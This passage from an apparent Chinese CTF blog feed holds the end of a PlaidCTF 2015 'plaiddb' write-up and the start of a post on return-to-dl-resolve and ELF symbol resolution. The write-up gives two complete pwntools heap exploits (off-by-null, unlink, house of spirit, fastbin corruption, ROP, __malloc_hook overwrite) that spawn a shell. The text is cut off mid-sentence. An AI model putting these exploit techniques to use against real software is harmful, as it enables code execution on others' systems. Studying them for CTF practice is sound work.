[freed] =&gt; node &#39;fillup2&#39;datastore-&gt;malloc(56)             = 0x55ac13f224f0 =&gt; node &#39;4&#39; =&gt; [freed] =&gt; node &#39;fillup1&#39;datastore-&gt;malloc(8)              = 0x55ac13f22530 =&gt; &#39;3&#39; =&gt; [freed]datastore-&gt;malloc(56)             = 0x55ac13f22550 =&gt; node &#39;6&#39;datastore-&gt;malloc(56)             = 0x55ac13f22590 =&gt; node &#39;5&#39; =&gt; [freed]datastore-&gt;malloc(8)              = 0x55ac13f225d0 =&gt; &#39;5&#39; =&gt; [freed]datastore-&gt;malloc(56)             = 0x55ac13f225f0 =&gt; node &#39;3&#39; =&gt; [freed]datastore-&gt;malloc(56)             = 0x55ac13f22630 =&gt; node &#39;1&#39; =&gt; [freed]datastore-&gt;malloc(8)              = 0x55ac13f22670 =&gt; &#39;2&#39;datastore-&gt;malloc(56)             = 0x55ac13f22690 =&gt; node &#39;2&#39;datastore-&gt;malloc(8)              = 0x55ac13f226d0 =&gt; &#39;1&#39; =&gt; [freed] =&gt; &#39;fillup1&#39;datastore-&gt;malloc(512)            = 0x55ac13f226f0 =&gt; &#39;1&#39; * 0x200 =&gt; [freed] &lt;= unlink pointer =&gt; &#39;X&#39; * 0x200datastore-&gt;malloc(80)             = 0x55ac13f22900 =&gt; &#39;2&#39; * 0x50datastore-&gt;malloc(104)            = 0x55ac13f22960 =&gt; &#39;5&#39; * 0x68 =&gt; [freed] &lt;= overlap fddatastore-&gt;malloc(504)            = 0x55ac13f229d0 =&gt; &#39;3&#39; * 0x1f8 =&gt; [freed] =&gt; &#39;A&#39; * 0x1f0 + p64(0xdb0 - 0x6f0)datastore-&gt;malloc(240)            = 0x55ac13f22bd0 =&gt; &#39;4&#39; * 0xf0 =&gt; [freed]datastore-&gt;malloc(1024)           = 0x55ac13f22cd0 =&gt; &#39;6&#39; * 0x400</code></pre><h1 id="Exploit-Script"><a href="#Exploit-Script" class="headerlink" title="Exploit Script"></a>Exploit Script</h1><p>第一种方法的 Exploit 主要是跟着 Winesap 做的：</p><pre><code class="python">#!/usr/bin/env pythonfrom pwn import *context.arch = &#39;amd64&#39;context.log_level = &#39;debug&#39;local = 0if local:    p = process(&#39;./datastore&#39;)    libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)else:    p = remote(&#39;127.0.0.1&#39;, 4000)    libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)def cmd(c):    p.recvuntil(&#39;Enter command:&#39;)    p.sendline(c)def PUT(key, data):    cmd(&#39;PUT&#39;)    p.recvuntil(&#39;Enter row key:&#39;)    p.sendline(key)    p.recvuntil(&#39;Enter data size:&#39;)    p.sendline(str(len(data)))    p.recvuntil(&#39;PROMPT: Enter data:&#39;)    p.send(data)def DEL(key):    cmd(&#39;DEL&#39;)    p.recvuntil(&#39;Enter row key:&#39;)    p.sendline(key)def GET(key):    cmd(&#39;GET&#39;)    p.recvuntil(&#39;Enter row key:&#39;)    p.sendline(key)    p.recvuntil(&#39; bytes]:\n&#39;)    return p.recvuntil(&#39;PROMPT: &#39;)[:-8]PUT(&#39;MMAP&#39;, &#39;Z&#39; * 0x21000)# Off by Null + UnlinkPUT(&#39;3&#39;, &#39;&#39;)PUT(&#39;0&#39;, &#39;C&#39; * 0x80) # smallbin for unlinkPUT(&#39;1&#39;, &#39;&#39;) # chunk for overflowPUT(&#39;2&#39;, &#39;&#39;)PUT(&#39;1&#39;, &#39;A&#39; * 0xf8)PUT(&#39;2&#39;, &#39;B&#39; * 0xf8 + p64(0x21) + &#39;C&#39; * 0x18) # chunk for off-by-null ; fake a fastbinDEL(&#39;1&#39;)DEL(&#39;X&#39; * 240 + p64(0x4c0 - 0x1d0)) # off-by-null(shrink) ; set prev_sizeDEL(&#39;0&#39;)DEL(&#39;2&#39;) # unlink#raw_input(&#39;@&#39;)# Leak Heap AddressDEL(&#39;3&#39;) # put a previous node chunk into fastbinPUT(&#39;KEY1&#39;, (&#39;A&#39; * 0x108 +    p64(0x40) + p64(0) + &#39;D&#39; * 0x30 +    p64(0x21) + p64(0) + &#39;C&#39; * 0x10 +    p64(0x21) + &#39;KEY1\x00&#39;).ljust(1000, &#39;Q&#39;))PUT(&#39;LEAKBUF&#39;, &#39;&#39;)data = GET(&#39;KEY1&#39;)heap_base = u64(data[0x110:0x118]) - 0x150info(&#39;heap_base = &#39; + hex(heap_base))#raw_input(&#39;@&#39;)# Function for Leaking Memorydef leak(addr, size):    PUT(&#39;KEY1&#39;, &#39;A&#39; * 0x3e8)    PUT(&#39;KEY1&#39;, data[:0x118] + p64(size) + p64(addr) + data[0x128:])    return GET(&#39;LEAKBUF&#39;)mmap_chunk = u64(leak(heap_base + 0xa0, 8)) - 0x10info(&#39;mmap_chunk = &#39; + hex(mmap_chunk))libc_base = u64(leak(mmap_chunk + 0x22000 + 0x750, 8)) - 0x5dc740info(&#39;libc_base = &#39; + hex(libc_base))canary = u64(leak(mmap_chunk + 0x22000 + 0x768, 8))info(&#39;canary = &#39; + hex(canary))stack_addr = u64(leak(mmap_chunk + 0x22000 + 0xa40, 8))info(&#39;stack_addr = &#39; + hex(stack_addr))#raw_input(&#39;@&#39;)# find Gadgets &amp; Bufferpop_rdi_ret = libc_base + libc.search(asm(&#39;pop rdi ; ret&#39;)).next()leave_ret = libc_base + libc.search(asm(&#39;leave ; ret&#39;)).next()system_addr = libc_base + libc.symbols[&#39;system&#39;]bin_sh_addr = libc_base + libc.search(&#39;/bin/sh&#39;).next()info(&#39;pop_rdi_ret = &#39; + hex(pop_rdi_ret))info(&#39;leave_ret = &#39; + hex(leave_ret))info(&#39;system_addr = &#39; + hex(system_addr))info(&#39;bin_sh_addr = &#39; + hex(bin_sh_addr))fake_chunk_addr = stack_addr - 0x90fake_rbp = heap_base + 0x420 - 8#raw_input(&#39;@&#39;)# House of Spirit + Fastbin Corruption + ROPPUT(&#39;KEY1&#39;, &#39;A&#39; * 0x3e8)PUT(&#39;KEY1&#39;, (&#39;A&#39; * 0x108 +    p64(0x40) + p64(heap_base + 0x3e0) + # point LEAKBUF&#39;s key to &#39;P\x00&#39;    p64(0x64) + p64(0) + p64(0) + p64(0) + p64(0) +    p64(0x40) + p64(0x40) + &#39;KEY1\x00&#39;.ljust(0x38, &#39;A&#39;) + # 0x358    p64(0x40) + &#39;A&#39; * 0x78 + # 0x3d8    p64(0x40) + &#39;P\x00&#39;.ljust(0x38, &#39;A&#39;) + p64(0x41)).ljust(0x3e8, &#39;Q&#39;))DEL(&#39;P&#39;) # house of spiritDEL(&#39;KEY1&#39;)#raw_input(&#39;@&#39;)PUT(&#39;KEY1&#39;, (&#39;A&#39; * 0x108 +    p64(0x40) + p64(heap_base + 0x3e0) +    p64(0x64) + p64(0) + p64(0) + p64(0) + p64(0) +    p64(0x40) + p64(0x40) + p64(fake_chunk_addr) + &#39;A&#39; * 0x30 +    p64(0x40) + &#39;A&#39; * 0x78 + # 0x3d8    p64(0x40) + &#39;A&#39; * 0x40 + # 0x420    p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(system_addr)).ljust(0x3e8, &#39;Q&#39;) # place gadgets) # fastbin corruption#raw_input(&#39;@&#39;)cmd(&#39;PUT&#39;)p.recvuntil(&#39;Enter row key:&#39;)p.sendline(&#39;KEY1&#39;)p.recvuntil(&#39;Enter data size:&#39;)p.send(&#39;56&#39;.ljust(8, &#39; &#39;) + p64(0x42))p.recvuntil(&#39;PROMPT: Enter data:&#39;)#raw_input(&#39;@&#39;)p.send((&#39;A&#39; * 7 + p64(canary) + &#39;A&#39; * 0x10 + p64(fake_rbp) + p64(leave_ret)).ljust(55, &#39;A&#39;))p.recvuntil(&#39;INFO: Update successful.\n&#39;)p.interactive()</code></pre><p>另一种做法：</p><pre><code class="python">#!/usr/bin/env pythonfrom pwn import *context.arch = &#39;amd64&#39;context.log_level = &#39;debug&#39;local = 1if local:    p = process(&#39;./datastore&#39;)    libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)else:    p = remote(&#39;127.0.0.1&#39;, 4000)    libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)def cmd(c):    p.recvuntil(&#39;Enter command:&#39;)    p.sendline(c)def PUT(key, data):    cmd(&#39;PUT&#39;)    p.recvuntil(&#39;Enter row key:&#39;)    p.sendline(key)    p.recvuntil(&#39;Enter data size:&#39;)    p.sendline(str(len(data)))    p.recvuntil(&#39;PROMPT: Enter data:&#39;)    p.send(data)def DEL(key):    cmd(&#39;DEL&#39;)    p.recvuntil(&#39;Enter row key:&#39;)    p.sendline(key)def GET(key):    cmd(&#39;GET&#39;)    p.recvuntil(&#39;Enter row key:&#39;)    p.sendline(key)    p.recvuntil(&#39; bytes]:\n&#39;)    return p.recvuntil(&#39;PROMPT: &#39;)[:-8]for i in range(10):    PUT(str(i), str(i) * 0x38)for i in range(10):    DEL(str(i))PUT(&#39;1&#39;, &#39;1&#39; * 0x200)PUT(&#39;2&#39;, &#39;2&#39; * 0x50)PUT(&#39;5&#39;, &#39;5&#39; * 0x68)PUT(&#39;3&#39;, &#39;3&#39; * 0x1f8)PUT(&#39;4&#39;, &#39;4&#39; * 0xf0)PUT(&#39;6&#39;, &#39;6&#39; * 0x400)DEL(&#39;5&#39;)DEL(&#39;3&#39;)DEL(&#39;1&#39;)DEL(&#39;A&#39; * 0x1f0 + p64(0xbd0 - 0x6f0)) # off-by-null + shrinkDEL(&#39;4&#39;) # unlinkPUT(&#39;fillup1&#39;, &#39;X&#39; * 0x200)PUT(&#39;fillup2&#39;, &#39;X&#39; * 0x200)data = GET(&#39;2&#39;)libc_base = u64(data[:8]) - 0x3c27b8info(&#39;libc_base = &#39; + hex(libc_base))#raw_input(&#39;@&#39;)free_hook = libc_base + libc.symbols[&#39;__free_hook&#39;]malloc_hook = libc_base + libc.symbols[&#39;__malloc_hook&#39;]system = libc_base + libc.symbols[&#39;system&#39;]one_gadgets = [0x46428, 0x4647c, 0xe9415, 0xea36d]one_gadget = libc_base + one_gadgets[1]info(&#39;one_gadget = &#39; + hex(one_gadget))PUT(&#39;fastatk&#39;, (&#39;A&#39; * 0x58 + p64(0x71) + p64(malloc_hook - 0x23)).ljust(0x100, &#39;\x00&#39;))PUT(&#39;X&#39;, &#39;X&#39; * 0x68)#raw_input(&#39;@&#39;)PUT(&#39;atk&#39;, (&#39;A&#39; * 0x13 + p64(one_gadget)).ljust(0x68, &#39;\x00&#39;))DEL(&#39;2&#39;)p.interactive()</code></pre><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/off_by_one-zh/#2-plaidctf-2015-plaiddb" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/off_by_one-zh/#2-plaidctf-2015-plaiddb</a><br><a href="https://www.youtube.com/watch?v=jEHgm7S58N8" target="_blank" rel="noopener">https://www.youtube.com/watch?v=jEHgm7S58N8</a><br><a href="http://winesap.logdown.com/posts/261369-plaid-ctf-2015-plaiddb-writeup" target="_blank" rel="noopener">http://winesap.logdown.com/posts/261369-plaid-ctf-2015-plaiddb-writeup</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;之前本来想写篇 Off-by-One 相关的，后来感觉理解了思想以后也不需要额外去多折腾什么了。这里记录一道比较复杂的题目。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="ctf" scheme="blog.b3ale.cn/tags/ctf/"/>
    
      <category term="pwn" scheme="blog.b3ale.cn/tags/pwn/"/>
    
      <category term="wp" scheme="blog.b3ale.cn/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>A Trip of Symbol Resolution</title>
    <link href="blog.b3ale.cn/2020/04/06/A-Trip-of-Symbol-Resolution/"/>
    <id>blog.b3ale.cn/2020/04/06/A-Trip-of-Symbol-Resolution/</id>
    <published>2020-04-06T08:04:26.000Z</published>
    <updated>2020-04-21T13:13:04.481Z</updated>
    
    <content type="html"><![CDATA[<p>重看 Winesap 的视频收获颇多，重新把 return-to-dl-resolve 整理了一下。</p><a id="more"></a><h1 id="Prepare"><a href="#Prepare" class="headerlink" title="Prepare"></a>Prepare</h1><p>需要编译一个带调试信息的 libc，之前的博客里记录过。要在 gdb 里跟进带调试信息 ld.so 的 Makefile 如下：</p><pre><code>all: aa: a.c        gcc a.c -o a -Wl,-dynamic-linker /path/to/install/lib/ld-2.23.so -g</code></pre><p>使用 apt 安装的 gdb 在 <code>_dl_fixup()</code> 中不能单步跟，会直接略过，通过修改源码添加一个环境变量来更改 gdb 的跟进。这里以 gdb-7.11.1 为例：</p><pre><code class="cpp">...6501   /* If we are stepping at the source level and entered the runtime6502      loader dynamic symbol resolution code...65036504      EXEC_FORWARD: we keep on single stepping until we exit the run6505      time loader code and reach the callee&#39;s address.65066507      EXEC_REVERSE: we&#39;ve already executed the callee (backward), and6508      the runtime loader code is handled just like any other6509      undebuggable function call.  Now we need only keep stepping6510      backward through the trampoline code, and that&#39;s handled further6511      down, so there is nothing for us to do here.  */65126513   static int env_debug_resolver = -1;6514   if (env_debug_resolver == -1) {6515     char *env_debug_resolver_str = getenv(&quot;DEBUG_RESOLVER&quot;);6516     if (env_debug_resolver_str &amp;&amp; !strcmp(env_debug_resolver_str, &quot;1&quot;)) {6517       env_debug_resolver = 1;6518     } else {6519       env_debug_resolver = 0;6520     }6521   }6522   if (execution_direction != EXEC_REVERSE6523       &amp;&amp; ecs-&gt;event_thread-&gt;control.step_over_calls == STEP_OVER_UNDEBUGGABLE6524       &amp;&amp; env_debug_resolver == 06525       &amp;&amp; in_solib_dynsym_resolve_code (stop_pc))6526     {6527       CORE_ADDR pc_after_resolver =6528         gdbarch_skip_solib_resolver (gdbarch, stop_pc);...</code></pre><p>生成 Makefile 时必须添加 <code>--enable-tui</code> 才会有 layout 的界面（编译的时候使用系统默认 python 版本，如果需要 pwndbg、gef 之类的插件就必须用 python3）：</p><pre><code class="bash">../configure --enable-tui --with-python=/usr/bin/python2.7</code></pre><p>如果在最后安装 gdb 的时候出现 <code>makeinfo: not found</code>，只需要装个 <code>texinfo</code> 即可：</p><pre><code class="bash">/home/b3ale/gdb-7.11.1/missing: 81: /home/b3ale/gdb-7.11.1/missing: makeinfo: not foundWARNING: &#39;makeinfo&#39; is missing on your system.         You should only need it if you modified a &#39;.texi&#39; file, or         any other file indirectly affecting the aspect of the manual.         You might want to install the Texinfo package:         &lt;http://www.gnu.org/software/texinfo/&gt;         The spurious makeinfo call might also be the consequence of         using a buggy &#39;make&#39; (AIX, DU, IRIX), in which case you might         want to install GNU make:         &lt;http://www.gnu.org/software/make/&gt;Makefile:503: recipe for target &#39;gdb.info&#39; failedmake[5]: *** [gdb.info] Error 127make[5]: Leaving directory &#39;/home/b3ale/gdb-7.11.1/build/gdb/doc&#39;Makefile:1505: recipe for target &#39;subdir_do&#39; failedmake[4]: *** [subdir_do] Error 1make[4]: Leaving directory &#39;/home/b3ale/gdb-7.11.1/build/gdb&#39;Makefile:1240: recipe for target &#39;install-only&#39; failedmake[3]: *** [install-only] Error 2make[3]: Leaving directory &#39;/home/b3ale/gdb-7.11.1/build/gdb&#39;Makefile:1237: recipe for target &#39;install&#39; failedmake[2]: *** [install] Error 2make[2]: Leaving directory &#39;/home/b3ale/gdb-7.11.1/build/gdb&#39;Makefile:9185: recipe for target &#39;install-gdb&#39; failedmake[1]: *** [install-gdb] Error 2make[1]: Leaving directory &#39;/home/b3ale/gdb-7.11.1/build&#39;Makefile:2248: recipe for target &#39;install&#39; failedmake: *** [install] Error 2</code></pre><p>在需要调试 <code>_dl_fixup()</code> 时只需要 export 一个环境变量即可：</p><pre><code class="bash">export DEBUG_RESOLVER=1</code></pre><p>对于没有链接带符号 ld 的程序，可以在本地做一个软链接，然后把程序中 ld 对应的字符串替换掉（以 32 位为例）：</p><pre><code class="bash">sed -i s/ld-linux.so.2/LD-linux.so.2/g ./binary</code></pre><h1 id="How-DynELF-Works"><a href="#How-DynELF-Works" class="headerlink" title="How DynELF Works?"></a>How DynELF Works?</h1><p>在 pwntools 中有一个工具叫 DynELF，可以通过一个任意内存读的漏洞来对获取 libc 以及解析出 libc 中任何函数的地址。它的原理跟 ELF 的相关结构有关，下面先来看看怎么使用 DynELF。</p><h2 id="PlaidCTF-2013-ropasaurusrex"><a href="#PlaidCTF-2013-ropasaurusrex" class="headerlink" title="PlaidCTF-2013-ropasaurusrex"></a>PlaidCTF-2013-ropasaurusrex</h2><p>以 PlaidCTF 2013 中的 ropasaurusrex 为例。程序很简单，明显有溢出：</p><pre><code class="cpp">ssize_t __cdecl main(){  vul();  return write(1, &quot;WIN\n&quot;, 4u);}ssize_t vul(){  char buf; // [esp+10h] [ebp-88h]  return read(0, &amp;buf, 0x100u);}</code></pre><p>通过溢出可以修改返回地址为 <code>start</code>，来构造无限次输入；同时可以跳 <code>write</code> 来泄漏信息。能构造出如下的 leak 函数，每次可以泄漏指定地址上的 4 个字节的数据：</p><pre><code class="python">elf = ELF(&#39;./ropasaurusrex&#39;)write_plt = elf.plt[&#39;write&#39;]start_addr = 0x8048340def leak(addr):    payload = flat(        &#39;A&#39; * 140,        write_plt,        start_addr,        1,        addr,        4    )    p.sendline(payload)    data = p.recv(4)    info(hex(addr) + &#39; ==&gt; &#39; + data)    return data</code></pre><p>使用 DynELF 指定开始泄漏的地址，可以把 libc 的基址泄漏出来：</p><pre><code class="python">#  0x8048000  0x8049000 r-xp     1000 0      /root/tmp/ropasaurusrexprog = DynELF(leak, 0x8048000)bases = prog.bases()info(bases)for l in bases:    if &#39;libc.so.6&#39; in l:        ptr = bases[l]info(&#39;ptr =&gt; &#39; + hex(ptr))</code></pre><p>然后从 libc 基址开始使用 DynELF 找到 <code>system</code> 和 <code>read</code> 的地址：</p><pre><code class="python">libc = DynELF(leak, ptr)system_addr = libc.lookup(&#39;system&#39;)read_addr = libc.lookup(&#39;read&#39;)</code></pre><h2 id="Lazy-Symbol-Binding"><a href="#Lazy-Symbol-Binding" class="headerlink" title="Lazy Symbol Binding"></a>Lazy Symbol Binding</h2><p>接下来慢慢解释 DynELF 是怎么实现的。先要了解延迟绑定这一概念。在程序执行的过程中，可能有些引入的 C 库函数到结束时都不会执行。所以 ELF 采用延迟绑定的技术，在第一次调用 C 库函数时才会去寻找真正的位置进行绑定：</p><ul><li>程序启动时，外部函数的地址未知（比如说在 libc 中的函数）</li><li>只有动态链接的程序需要解析函数地址，静态链接的程序不需要</li><li>函数第一次被调用时，通过 Dynamic Resolver 来计算函数的地址，并在 GOT 上做好重定位</li></ul><h2 id="ELF-Structure"><a href="#ELF-Structure" class="headerlink" title="ELF Structure"></a>ELF Structure</h2><p>接下来了解一下 ELF 文件的结构。结构体在 <a href="https://code.woboq.org/userspace/glibc/elf/elf.h.html" target="_blank" rel="noopener"><code>glibc/elf/elf.h</code></a> 中。</p><p>笼统地来说，ELF 包括 ELF Header、Program Header Table、Section（Segment）、Section Header Table 几个部分。在程序执行前和执行时，ELF 的结构是不同的。在程序执行前，ELF Header 中存储了 Section Header Table 的位置，而 Section Header Table 中又存储了每个 Section 的位置；在程序执行时，一个或多个 Section 会被映射到一个 Segment 中，ELF Header 中存储了 Program Header Table 的位置，而 Program Header Table 中存储了各个 Segment 的地址：</p><pre><code>             Linking View                        Execution View       +----------------------+             +----------------------+       |      ELF Header      |  ---+ +---  |      ELF Header      |       |----------------------|     | |     |----------------------|       | Program Header Table |     | +---&gt; | Program Header Table |  ---+       |      (optional)      |     |       |----------------------|     |       |----------------------|     |       |                      |     | +---&gt; |      Section 1       | ----|-----&gt; |      Segment 1       | &lt;---| |     |----------------------|     | |     |                      |     | |     |         ...          | ----|-+     |----------------------|     | |     |----------------------|     |       |                      |     | |---&gt; |      Section n       | ----|-----&gt; |      Segment 2       | &lt;---+ |     |----------------------|     | |     |                      | |     |         ...          | ----|-+     |----------------------| |     |----------------------|     |       | Section Header Table | +---  | Section Header Table | &lt;---+       |      (optional)      |       +----------------------+             +----------------------+</code></pre><p>几个部分大概的描述如下：</p><ul><li>Section（节区）：存放代码和数据的一块连续内存（例：.text、.data、.bss、.got）<ul><li><code>objdump -j .got.plt -s ./</code></li></ul></li><li>Segment（段）：包含多个 Section 的连续内存</li><li>Program Header Table 描述 Section 和 Segment 的对应关系，不一定所有的 Section 都会有映射，所以 Section 中的数据不一定全部出现在内存中</li></ul><p>ELF Header 中，<code>e_ident</code> 存储了 Magic Number 即 <code>&quot;\x7fELF&quot;</code>，<code>e_machine</code> 即程序对应的架构，<code>e_entry</code> 存储了程序的入口点，<code>e_phoff</code> 和 <code>e_shoff</code> 分别存储了 Program Header Table 和 Section Header Table 的偏移，<code>e_phentsize</code> 和 <code>e_shentsize</code> 分别存储了 Program Header Table 和 Section Header Table 的结构体大小，<code>e_phnum</code> 和 <code>e_shnum</code> 分别存储了 Program Header Table 和 Section Header Table 中 Header 的数量：</p><pre><code class="cpp">typedef struct{  unsigned char        e_ident[EI_NIDENT];        /* Magic number and other info */  Elf32_Half        e_type;                        /* Object file type */  Elf32_Half        e_machine;                /* Architecture */  Elf32_Word        e_version;                /* Object file version */  Elf32_Addr        e_entry;                /* Entry point virtual address */  Elf32_Off        e_phoff;                /* Program header table file offset */  Elf32_Off        e_shoff;                /* Section header table file offset */  Elf32_Word        e_flags;                /* Processor-specific flags */  Elf32_Half        e_ehsize;                /* ELF header size in bytes */  Elf32_Half        e_phentsize;                /* Program header table entry size */  Elf32_Half        e_phnum;                /* Program header table entry count */  Elf32_Half        e_shentsize;                /* Section header table entry size */  Elf32_Half        e_shnum;                /* Section header table entry count */  Elf32_Half        e_shstrndx;                /* Section header string table index */} Elf32_Ehdr;typedef struct{  unsigned char        e_ident[EI_NIDENT];        /* Magic number and other info */  Elf64_Half        e_type;                        /* Object file type */  Elf64_Half        e_machine;                /* Architecture */  Elf64_Word        e_version;                /* Object file version */  Elf64_Addr        e_entry;                /* Entry point virtual address */  Elf64_Off        e_phoff;                /* Program header table file offset */  Elf64_Off        e_shoff;                /* Section header table file offset */  Elf64_Word        e_flags;                /* Processor-specific flags */  Elf64_Half        e_ehsize;                /* ELF header size in bytes */  Elf64_Half        e_phentsize;                /* Program header table entry size */  Elf64_Half        e_phnum;                /* Program header table entry count */  Elf64_Half        e_shentsize;                /* Section header table entry size */  Elf64_Half        e_shnum;                /* Section header table entry count */  Elf64_Half        e_shstrndx;                /* Section header string table index */} Elf64_Ehdr;</code></pre><p>Section Header Table 是一个 <code>Elf64_Shdr</code>（<code>Elf32_Shdr</code>）的数组（程序执行时一般没有 Section Header Table），指出每个 Section 的地址：</p><pre><code class="cpp">/* Section header.  */typedef struct{  Elf32_Word        sh_name;                /* Section name (string tbl index) */  Elf32_Word        sh_type;                /* Section type */  Elf32_Word        sh_flags;                /* Section flags */  Elf32_Addr        sh_addr;                /* Section virtual addr at execution */  Elf32_Off        sh_offset;                /* Section file offset */  Elf32_Word        sh_size;                /* Section size in bytes */  Elf32_Word        sh_link;                /* Link to another section */  Elf32_Word        sh_info;                /* Additional section information */  Elf32_Word        sh_addralign;                /* Section alignment */  Elf32_Word        sh_entsize;                /* Entry size if section holds table */} Elf32_Shdr;typedef struct{  Elf64_Word        sh_name;                /* Section name (string tbl index) */  Elf64_Word        sh_type;                /* Section type */  Elf64_Xword        sh_flags;                /* Section flags */  Elf64_Addr        sh_addr;                /* Section virtual addr at execution */  Elf64_Off        sh_offset;                /* Section file offset */  Elf64_Xword        sh_size;                /* Section size in bytes */  Elf64_Word        sh_link;                /* Link to another section */  Elf64_Word        sh_info;                /* Additional section information */  Elf64_Xword        sh_addralign;                /* Section alignment */  Elf64_Xword        sh_entsize;                /* Entry size if section holds table */} Elf64_Shdr;</code></pre><p>Program Header Table 是一个 <code>Elf64_Phdr</code>（<code>Elf32_Phdr</code>）的数组，指定数据以及其在内存中的位置，即某个范围会被加载到哪个地址（Segment 包含多个 Section）：</p><pre><code class="cpp">/* Program segment header.  */typedef struct{  Elf32_Word        p_type;                        /* Segment type */  Elf32_Off        p_offset;                /* Segment file offset */  Elf32_Addr        p_vaddr;                /* Segment virtual address */  Elf32_Addr        p_paddr;                /* Segment physical address */  Elf32_Word        p_filesz;                /* Segment size in file */  Elf32_Word        p_memsz;                /* Segment size in memory */  Elf32_Word        p_flags;                /* Segment flags */  Elf32_Word        p_align;                /* Segment alignment */} Elf32_Phdr;typedef struct{  Elf64_Word        p_type;                        /* Segment type */  Elf64_Word        p_flags;                /* Segment flags */  Elf64_Off        p_offset;                /* Segment file offset */  Elf64_Addr        p_vaddr;                /* Segment virtual address */  Elf64_Addr        p_paddr;                /* Segment physical address */  Elf64_Xword        p_filesz;                /* Segment size in file */  Elf64_Xword        p_memsz;                /* Segment size in memory */  Elf64_Xword        p_align;                /* Segment alignment */} Elf64_Phdr;</code></pre><h3 id="Dynamic-Section"><a href="#Dynamic-Section" class="headerlink" title="Dynamic Section"></a>Dynamic Section</h3><p><code>.dynamic</code> 是一个 <code>Elf64_Dyn</code>（<code>Elf32_Dyn</code>）数组，是解析 Symbol 时最重要的一个 Section。执行时可以根据 Program Header Table，找出 <code>p_type</code> 值为 <code>PT_DYNAMIC</code> 的 Program Header。Program Header Table 的基址加上 <code>p_offset</code> 的结果就是 <code>.dynamic</code> 的地址。其中的 <code>union</code> 里用 <code>d_val</code> 还是 <code>d_ptr</code> 取决于 <code>d_tag</code>（<code>DT_xxx</code>）：</p><pre><code class="cpp">/* Dynamic section entry.  */typedef struct{  Elf32_Sword        d_tag;                        /* Dynamic entry type */  union    {      Elf32_Word d_val;                        /* Integer value */      Elf32_Addr d_ptr;                        /* Address value */    } d_un;} Elf32_Dyn;typedef struct{  Elf64_Sxword        d_tag;                        /* Dynamic entry type */  union    {      Elf64_Xword d_val;                /* Integer value */      Elf64_Addr d_ptr;                        /* Address value */    } d_un;} Elf64_Dyn;</code></pre><h4 id="dynsym"><a href="#dynsym" class="headerlink" title=".dynsym"></a><code>.dynsym</code></h4><p><code>.dynsym</code> 是 <code>.dynamic</code> 中 <code>d_tag</code> 为 <code>DT_SYMTAB</code> 的 entry，<code>d_ptr</code> 指向 <code>.dynsym</code> Section（<code>Elf64_Sym</code> 或 <code>Elf32_Sym</code> 数组）。其中 <code>st_name</code> 指向 Symbol Name：</p><pre><code class="cpp">/* Symbol table entry.  */typedef struct{  Elf32_Word        st_name;                /* Symbol name (string tbl index) */  Elf32_Addr        st_value;                /* Symbol value */  Elf32_Word        st_size;                /* Symbol size */  unsigned char        st_info;                /* Symbol type and binding */  unsigned char        st_other;                /* Symbol visibility */  Elf32_Section        st_shndx;                /* Section index */} Elf32_Sym;typedef struct{  Elf64_Word        st_name;                /* Symbol name (string tbl index) */  unsigned char        st_info;                /* Symbol type and binding */  unsigned char st_other;                /* Symbol visibility */  Elf64_Section        st_shndx;                /* Section index */  Elf64_Addr        st_value;                /* Symbol value */  Elf64_Xword        st_size;                /* Symbol size */} Elf64_Sym;</code></pre><h4 id="dynstr"><a href="#dynstr" class="headerlink" title=".dynstr"></a><code>.dynstr</code></h4><p><code>.dynstr</code> 是 <code>.dynamic</code> 中 <code>d_tag</code> 为 <code>DT_STRTAB</code> 的 entry，是 <code>.dynsym</code> 中 <code>st_name</code> 对应的字符串表（<code>name = (char *)(.dynstr+.dynsym[xx]-&gt;st_name)</code>）。</p><h4 id="rel-plt（-rela-plt）"><a href="#rel-plt（-rela-plt）" class="headerlink" title=".rel.plt（.rela.plt）"></a><code>.rel.plt</code>（<code>.rela.plt</code>）</h4><p><code>.rel.plt</code>（<code>.rela.plt</code>）是 <code>.dynamic</code> 中 <code>d_tag</code> 为 <code>DT_JMPREL</code> 的 entry，对应的结构体是 <code>Elf64_Rela</code>（<code>Elf32_Rel</code>）。<code>XX_Rela</code> 相比 <code>XX_Rel</code> 多了一个没什么用处的 <code>r_addend</code>，测试的时候发现 32 位程序用的是 <code>Elf32_Rel</code>，而 64 位程序用的是 <code>Elf64_Rela</code>。<code>r_offset</code> 为需要重定位的地址的偏移，即 <code>.got.plt</code>（GOT）；<code>r_info</code> 中包含 Symbol Index（Symbol Index 即为 <code>.dynsym</code> 中的 Section Index）。<code>ELF64_R_SYM</code>（<code>#define ELF64_R_SYM(i) ((i) &gt;&gt; 32)</code>）用来取高 32bit；<code>ELF32_R_SYM</code>（<code>#define ELF32_R_SYM(val) ((val) &gt;&gt; 8)</code>）用来取高 24bit：</p><pre><code class="cpp">/* Relocation table entry without addend (in section of type SHT_REL).  */typedef struct{  Elf32_Addr        r_offset;                /* Address */  Elf32_Word        r_info;                        /* Relocation type and symbol index */} Elf32_Rel;/* I have seen two different definitions of the Elf64_Rel and   Elf64_Rela structures, so we&#39;ll leave them out until Novell (or   whoever) gets their act together.  *//* The following, at least, is used on Sparc v9, MIPS, and Alpha.  */typedef struct{  Elf64_Addr        r_offset;                /* Address */  Elf64_Xword        r_info;                        /* Relocation type and symbol index */} Elf64_Rel;/* Relocation table entry with addend (in section of type SHT_RELA).  */typedef struct{  Elf32_Addr        r_offset;                /* Address */  Elf32_Word        r_info;                        /* Relocation type and symbol index */  Elf32_Sword        r_addend;                /* Addend */} Elf32_Rela;typedef struct{  Elf64_Addr        r_offset;                /* Address */  Elf64_Xword        r_info;                        /* Relocation type and symbol index */  Elf64_Sxword        r_addend;                /* Addend */} Elf64_Rela;</code></pre><h2 id="Symbol-Resolve"><a href="#Symbol-Resolve" class="headerlink" title="Symbol Resolve"></a>Symbol Resolve</h2><p>接下来看程序是怎么解 Symbol 的。在 Symbol 还没有没解析好的时候，PLT 中的第一条指令会 JMP 到 GOT，而 GOT 原本的值是 PLT 